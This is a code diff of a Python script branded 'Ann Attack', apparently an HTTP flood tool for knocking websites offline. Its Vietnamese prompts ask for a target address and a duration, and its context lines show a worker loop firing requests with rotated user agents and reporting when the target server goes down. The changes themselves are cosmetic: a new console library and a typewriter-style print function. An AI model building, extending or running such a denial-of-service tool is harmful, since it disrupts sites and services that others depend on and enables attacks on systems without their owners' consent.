@@ -5,8 +5,7 @@ import time
 import os
 import sys
 from time import sleep
-import nguyenthanhngoc
-from nguyenthanhngoc import *
+from rich.console import Console
 from pystyle import Colors, Colorate
 from concurrent.futures import ThreadPoolExecutor
 USER_AGENTS = [
@@ -144,7 +143,11 @@ def send_request(url):
             print(Colorate.Diagonal(Colors.red_to_white,f"Ann Attack| Version 4.5 | Status: {status}"))
     except requests.RequestException as e:
         print(Colorate.Diagonal(Colors.red_to_white,f"Sever Khong Phan Hoi | Status: 500 ERROR WEBSITE SERVER IS DOWN"))
-
+def Write_Print(text, color, interval):
+    for char in text:
+        console.print(char, style=color, end="")
+        time.sleep(interval)
+    print() 
 def worker(url, duration, requests_per_milli):
     end_time = time.time() + duration
     while time.time() < end_time:
@@ -176,7 +179,7 @@ def main():
          ║      TOOL LO NEN CO THE BI NHA MANG PHAT HIEN        ║ 
          ╚══════════════════════════════════════════════════════╝
      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-\n""",Colors.red, interval=0.0009)
+\n""","red", 0.0009)
     sleep(2)
     url = input(Colorate.Diagonal(Colors.purple_to_blue,"Nhap dia chi web: ")).strip()
     duration = int(input(Colorate.Diagonal(Colors.purple_to_blue,"Nhap thoi gian: ")).strip())
